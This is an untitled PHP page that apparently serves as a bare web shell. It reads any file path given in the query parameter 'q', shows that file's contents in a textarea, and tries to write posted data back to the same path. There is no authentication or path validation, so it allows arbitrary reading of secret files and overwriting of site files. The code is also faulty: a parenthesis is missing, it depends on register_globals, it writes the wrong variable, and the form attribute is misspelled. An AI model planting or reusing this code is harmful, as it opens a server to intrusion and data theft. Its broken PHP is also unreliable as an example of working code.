<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>无标题文档</title>
</head>

<body>


<?php

$cfile=$_GET["q"]; 

	//
	if(isset($edit)
	{
	   $fp = @fopen($cfile,'wb');
	   echo @fwrite($fp,$edit) ? 'succed!' : 'faled!';
	   @fclose($fp);
	}

	
	//
	$cfilehandle=fopen($cfile,"r"); 
	$editfile=fread($cfilehandle,filesize($cfile)); 
	fclose($cfilehandle); 
	echo "<form active=$PHP_SELF method=post>"; 
	echo "<textarea cols=60 rows=15 name=copy id=code>"; 
	echo $editfile; 
	echo "</textarea>"; 
	echo "<p><input type=submit value=提交 name=edit><input type=reset value=重填></form>"; 

?>



</body>
</html>
